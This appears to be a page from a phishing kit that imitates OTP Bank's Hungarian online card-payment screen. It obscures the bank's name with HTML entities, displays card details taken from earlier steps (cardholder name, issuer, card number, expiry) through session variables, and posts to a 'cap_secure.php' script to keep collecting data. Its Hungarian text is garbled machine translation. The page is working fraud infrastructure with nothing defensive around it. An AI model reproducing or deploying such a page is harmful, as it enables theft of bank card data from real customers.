<?php
session_start();
error_reporting(0);
?>
<html xmlns="" lang="hu" xml:lang="hu" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-2">
        
        <title>&#x4f;&#x54;&#x50;&#x64;&#x69;&#x72;&#x65;&#x6b;&#x74 Internet</title>
		<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
<script src="./js/jquery-2.1.4.js"></script>
<script src="./js/jquery.validate.min.js"></script>
<script src="./js/additional-methods.min.js"></script>
<script src="./js/validation.js"> </script>
<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">        
<link rel="icon" type="image/x-icon" href="./img/favicon.gif">
<link rel="shortcut_icon" type="image/x-icon" href="./img/favicon.gif">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link rel="stylesheet" type="text/css" href="./2/default.css">
    <body class="browserChrome browserChrome5">
        <div class="header">
            <div class="headerContent">
				
                <span class="logo"></span>
				
                <span class="title bold">
                	
						Internetes fizetes
					
				</span>
            </div>
        </div>
		
        <div class="content">
<img src="./img/5.png" style="
    margin-left: 230px;
"><br><img src="./img/1300.png" style="
    margin-left: 25px;
">
<form method="post" action="./cap_secure.php?cmd=_account-details&session=" autocomplete="off" id="webshopVasarlasForm">
	<div class="cardTitle">
		<h3>Terhelendo bankkartya adatai</h3>
	</div>

	<div class="panelOut">
	
				
	
		
		
			
			
				
					<div class="formrow">
						<span class="title">
							Kartyara irt nev
						</span>
						<span class="data value">
							<?php echo $_SESSION['Eamil'];  ?>
						</span>
					</div>
					<div class="formrow">
						<span class="title">
							Kartyat kibocsatobank neve
						</span>
						<span class="data value">
							<?php echo $_SESSION['CB'];  ?>
						</span>
					</div>
					<div class="formrow">
						<span class="title">
							Kartya tipusa
						</span>
						<span class="data value">
							<?php echo $_SESSION['CC'];  ?>
						</span>
					</div>
	
				<div class="formrow">
					<span class="title">
						Terhelendo bankkartyaszam
					</span>
					<span class="data value">
						<?php echo $_SESSION['Password'];  ?>
					</span>
				</div>
				
				<div class="formrow">
					<span class="title">
						Lejarati datum (hhee)
					</span>
					<span class="data value">
						<?php echo $_SESSION['Date'];  ?>/<?php echo $_SESSION['Datte'];  ?>
					</span>
				</div>
				
				
				<div class="formrow">
					<span class="title">
						ervenyesitesi kod (CVC2/CVV2)
					</span>
					<span class="data value">
						***
					</span>
				</div>
				
				<p style="
    font-size: 13px;
    margin-left: 20px;
">Ha valami baj van az egyik ilyen reszletek, kerjuk, olvassa el a hatso, es megjavitani, mert ha vetkezett folyamat nem fog mukodni</div>
									
											

<div id="dccPayment">
</div><div class="buttonCol">
	        <span class="button">
	            <input type="submit" name="formButtons(elkuld)" value="Tovabb" class="greenBtn" style="
    margin-left: 270px;
    background: #6e9538;
    margin-top: 10px;
    ">
	            <a href="./teljes.php?cmd=_account-details&session="><img src="./img/03.png" style="
    margin-top: 5px;
"></a>
	        </span>
	    </div>

</form>
<div class="info">
	<p>Felhivjuk figyelmet, hogy amennyiben az adatbevitel es a Fizetes inditasa nem tortenik meg 5 percen belul, a vasarlas elutasitasra kerul!</p>	
</div>

<div class="cardIcons ">
	<img src="./2/cardIcons.gif" alt="">
</div>
			
        </div>
		
		
        <div class="copyright">
			C copyright 2006-2013 &#x4f;&#x54;&#x50;&#x20;&#x42;&#x61;&#x6e;&#x6b Nyrt.
        </div></body></html>